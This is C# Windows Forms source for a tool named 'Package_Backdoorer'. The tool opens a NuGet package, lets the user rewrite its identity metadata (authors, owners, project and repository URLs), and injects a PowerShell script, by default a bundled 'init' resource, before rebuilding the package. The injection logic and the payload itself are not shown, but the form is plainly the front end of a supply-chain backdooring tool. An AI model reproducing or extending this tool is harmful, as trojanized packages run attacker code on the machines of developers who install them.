using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Package_Backdoorer
{


    public partial class Form1 : Form
    {
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
        (
            int nLeftRect,     // x-coordinate of upper-left corner
            int nTopRect,      // y-coordinate of upper-left corner
            int nRightRect,    // x-coordinate of lower-right corner
            int nBottomRect,   // y-coordinate of lower-right corner
            int nWidthEllipse, // width of ellipse
            int nHeightEllipse // height of ellipse
        );

        public const int WM_NCLBUTTONDOWN = 0xA1;
        private const int WM_NCHITTEST = 0x84;
        private const int HT_CLIENT = 0x1;
        private const int HT_CAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        private NuspecReader reader;
        private bool enableMetadaUpdates = false;

        public Form1()
        {

            InitializeComponent();

            animatedIconTimer.Start();

            //siticoneDataGridView1.AlternatingRowsDefaultCellStyle.BackColor = this.BackColor;
            //siticoneDataGridView1.AlternatingRowsDefaultCellStyle.ForeColor = this.ForeColor;
            //siticoneDataGridView1.AlternatingRowsDefaultCellStyle.SelectionBackColor = Color.FromArgb(99,99,99);
            //siticoneDataGridView1.AlternatingRowsDefaultCellStyle.SelectionForeColor = Color.CornflowerBlue;


            this.FormBorderStyle = FormBorderStyle.None;
            this.Region = Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 10, 10));
            this.closeBtn.Region = Region.FromHrgn(CreateRoundRectRgn(0, 0, closeBtn.Width, closeBtn.Height, 10, 10));
            this.filePathBox.DragEnter += FilePathBox_DragEnter;
            this.DragEnter += Form1_DragEnter;

            this.DragDrop += Form1_DragDrop;
            this.filePathBox.DragDrop += Form1_DragDrop;

            injectPsBox.Checked = Properties.Settings.Default.InjectPSBool;
            powershellScriptBox.Enabled = injectPsBox.Checked;

            DisableAll();

            if (Properties.Settings.Default.LastFile == "")
            {

                buildBtn.Enabled = false;
                //decryptBtn.Enabled = false;
            }
            else
            {
                if (File.Exists(Properties.Settings.Default.LastFile))
                {
                    filePathBox.Text = Properties.Settings.Default.LastFile;
                    reader = new NuspecReader(filePathBox.Text);
                    LoadMetadata(reader.Metadata);
                }
            }

            if (Properties.Settings.Default.PowershellScript != "")
            {
                powershellScriptBox.Text = Properties.Settings.Default.PowershellScript;
            }
        }

        private void DisableAll()
        {
            label16.Enabled = false;
            titleBox.Enabled = false;
            titleBox.Clear();

            label2.Enabled = false;
            versionBox.Enabled = false;
            versionBox.Clear();

            label3.Enabled = false;
            authorsBox.Enabled = false;
            authorsBox.Clear();

            label4.Enabled = false;
            descriptionBox.Enabled = false;
            descriptionBox.Clear();

            label11.Enabled = false;
            releaseNotesBox.Enabled = false;
            releaseNotesBox.Clear();

            label13.Enabled = false;
            languageBox.Enabled = false;
            languageBox.Clear();

            label15.Enabled = false;
            tagsBox.Enabled = false;
            tagsBox.Clear();

            label17.Enabled = false;
            readmeBox.Enabled = false;
            readmeBox.Clear();

            label18.Enabled = false;
            licenseBox.Enabled = false;
            licenseBox.Clear();

            label5.Enabled = false;
            idBox.Enabled = false;
            idBox.Clear();

            label8.Enabled = false;
            licenseUrlBox.Enabled = false;
            licenseUrlBox.Clear();

            label7.Enabled = false;
            projectUrlBox.Enabled = false;
            projectUrlBox.Clear();

            label6.Enabled = false;
            copyrightBox.Enabled = false;
            copyrightBox.Clear();

            label10.Enabled = false;
            iconBox.Enabled = false;
            iconBox.Clear();

            label12.Enabled = false;
            iconUrlBox.Enabled = false;
            iconUrlBox.Clear();

            label14.Enabled = false;
            repositoryBox.Enabled = false;
            repositoryBox.Clear();

            label9.Enabled = false;
            ownersBox.Enabled = false;
            ownersBox.Clear();

            label19.Enabled = false;
            summaryBox.Enabled = false;
            summaryBox.Clear();
        }

        private void Enable1(int num, string str)
        {
            if (num == 2)
            {
                label16.Enabled = true;
                titleBox.Enabled = true;
                titleBox.Text = str;
            }

            if (num == 1)
            {
                label2.Enabled = true;
                versionBox.Enabled = true;
                versionBox.Text = str;
            }
            if (num == 3)
            {
                label3.Enabled = true;
                authorsBox.Enabled = true;
                authorsBox.Text = str;
            }
            if (num == 10)
            {
                label4.Enabled = true;
                descriptionBox.Enabled = true;
                descriptionBox.Text = str;
            }
            if (num == 15)
            {
                label11.Enabled = true;
                releaseNotesBox.Enabled = true;
                releaseNotesBox.Text = str;
            }
            if (num == 16)
            {
                label13.Enabled = true;
                languageBox.Enabled = true;
                languageBox.Text = str;
            }
            if (num == 12)
            {
                label15.Enabled = true;
                tagsBox.Enabled = true;
                tagsBox.Text = str;
            }
            if (num == 7)
            {
                label17.Enabled = true;
                readmeBox.Enabled = true;
                readmeBox.Text = str;
            }
            if (num == 4)
            {
                label18.Enabled = true;
                licenseBox.Enabled = true;
                licenseBox.Text = str;
            }
            if (num == 0)
            {
                label5.Enabled = true;
                idBox.Enabled = true;
                idBox.Text = str;
            }
            if (num == 5)
            {
                label8.Enabled = true;
                licenseUrlBox.Enabled = true;
                licenseUrlBox.Text = str;
            }
            if (num == 8)
            {
                label7.Enabled = true;
                projectUrlBox.Enabled = true;
                projectUrlBox.Text = str;
            }
            if (num == 11)
            {
                label6.Enabled = true;
                copyrightBox.Enabled = true;
                copyrightBox.Text = str;
            }
            if (num == 6)
            {
                label10.Enabled = true;
                iconBox.Enabled = true;
                iconBox.Text = str;
            }
            if (num == 9)
            {
                label12.Enabled = true;
                iconUrlBox.Enabled = true;
                iconUrlBox.Text = str;
            }
            if (num == 13)
            {
                label14.Enabled = true;
                repositoryBox.Enabled = true;
                repositoryBox.Text = str;
            }
            if (num == 14)
            {
                label9.Enabled = true;
                ownersBox.Enabled = true;
                ownersBox.Text = str;
            }
            if (num == 17)
            {
                label19.Enabled = true;
                summaryBox.Enabled = true;
                summaryBox.Text = str;
            }
        }

        private void LoadMetadata(Dictionary<string, string> metadata)
        {
            enableMetadaUpdates = false;

            foreach (string key in metadata.Keys)
            {
                for (int i = 0; i < reader.metaDataTagNames.Length; i++)
                {
                    if (key == reader.metaDataTagNames[i])
                    {
                        Enable1(i, metadata[key]);
                        break;
                    }
                }
            }

            enableMetadaUpdates = true;
        }

        private void Form1_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                DisableAll();
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);

                if (files.Length > 0)
                {
                    string ext = Path.GetExtension(files[0]).Trim();
                    if (ext != ".nupkg")
                    {
                        MessageBox.Show("Error: must drag a *.nupkg file to build!", this.Text);
                    }
                    else
                    {
                        if (File.Exists(files[0]))
                        {
                            this.filePathBox.Text = files[0];

                            if (reader != null)
                            {
                                reader.Metadata.Clear();
                                reader.Dispose();
                                reader = null;
                            }

                            reader = new NuspecReader(filePathBox.Text);
                            reader.PowerShellScript = Properties.Resources.init;
                            LoadMetadata(reader.Metadata);


                            Properties.Settings.Default.LastFile = files[0];
                            Properties.Settings.Default.Save();
                            buildBtn.Enabled = true;
                        }
                        else
                        {
                            buildBtn.Enabled = false;
                        }
                    }
                }
            }
        }

        private void Form1_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.Copy;
        }

        private void FilePathBox_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.Copy;
        }

        private void buildBtn_Click(object sender, EventArgs e)
        {
            if (reader != null)
            {
                reader.Build();
            }
        }

        static readonly string[] SizeSuffixes =
                   { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };
        string SizeSuffix(Int64 value, int decimalPlaces = 1)
        {
            if (decimalPlaces < 0) { throw new ArgumentOutOfRangeException("decimalPlaces"); }
            if (value < 0) { return "-" + SizeSuffix(-value, decimalPlaces); }
            if (value == 0) { return string.Format("{0:n" + decimalPlaces + "} bytes", 0); }

            // mag is 0 for bytes, 1 for KB, 2, for MB, etc.
            int mag = (int)Math.Log(value, 1024);

            // 1L << (mag * 10) == 2 ^ (10 * mag)
            // [i.e. the number of bytes in the unit corresponding to mag]
            decimal adjustedSize = (decimal)value / (1L << (mag * 10));

            // make adjustment when the value is large enough that
            // it would round up to 1000 or more
            if (Math.Round(adjustedSize, decimalPlaces) >= 1000)
            {
                mag += 1;
                adjustedSize /= 1024;
            }

            return string.Format("{0:n" + decimalPlaces + "} {1}",
                adjustedSize,
                SizeSuffixes[mag]);
        }

        private void selectFileBtn_Click(object sender, EventArgs e)
        {
            OpenFileDialog diag = new OpenFileDialog();
            diag.Filter = "Nuget Package files (*.nupkg)|*.nupkg";
            diag.RestoreDirectory = true;
            if (diag.ShowDialog() == DialogResult.OK)
            {
                filePathBox.Text = diag.FileName;
                Properties.Settings.Default.LastFile = diag.FileName;
                Properties.Settings.Default.Save();

                buildBtn.Enabled = true;
                //decryptBtn.Enabled = true;
            }
        }

        protected override CreateParams CreateParams
        {
            get
            {
                // Activate double buffering at the form level.  All child controls will be double buffered as well.
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x02000000;  // Turn on WS_EX_COMPOSITED
                return cp;
            }
        }

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            if (m.Msg == WM_NCHITTEST)
                m.Result = (IntPtr)(HT_CAPTION);
        }

        private void compressionBox_CheckedChanged(object sender, EventArgs e)
        {
            //if (this.compressionBox.Checked)
            //{
            //    this.lzmaBox.Enabled = true;
            //}
            //else
            //{
            //    this.lzmaBox.Enabled = false;
            //}
        }

        private void injectPsBox_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.InjectPSBool = injectPsBox.Checked;
            Properties.Settings.Default.Save();
            powershellScriptBox.Enabled = injectPsBox.Checked;
        }

        private void powershellScriptBox_TextChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.PowershellScript = powershellScriptBox.Text;
            Properties.Settings.Default.Save();

            if (reader != null)
            {
                reader.PowerShellScript = powershellScriptBox.Text;
            }
        }

        private void updateMetaData(Control ctrl)
        {
            if (enableMetadaUpdates)
            {
                reader.Metadata[ctrl.Tag.ToString()] = ctrl.Text;
            }
        }

        private void titleBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void versionBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void authorsBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void descriptionBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void releaseNotesBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void languageBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void tagsBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void readmeBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void licenseBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void idBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void licenseUrlBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void projectUrlBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void copyrightBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void iconBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void iconUrlBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void repositoryBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void ownersBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        private void summaryBox_TextChanged(object sender, EventArgs e)
        {
            Control ctrl = (Control)sender;
            updateMetaData(ctrl);
        }

        int iconIdx = 0;
        private void animatedIconTimer_Tick(object sender, EventArgs e)
        {
            switch (iconIdx)
            {
                case 0:
                {
                    this.Icon = Properties.Resources.Frame_1;
                    //this.Invalidate();
                    break;
                }
                case 1:
                {
                    this.Icon = Properties.Resources.Frame_2;
                    //this.Invalidate();
                    break;
                }
                case 2:
                {
                    this.Icon = Properties.Resources.Frame_3;
                    //this.Invalidate();
                    break;
                }
            }
            if (iconIdx == 2)
            {
                iconIdx = 0;
            }
            else
            {
                iconIdx++;
            }
        }
    }
}
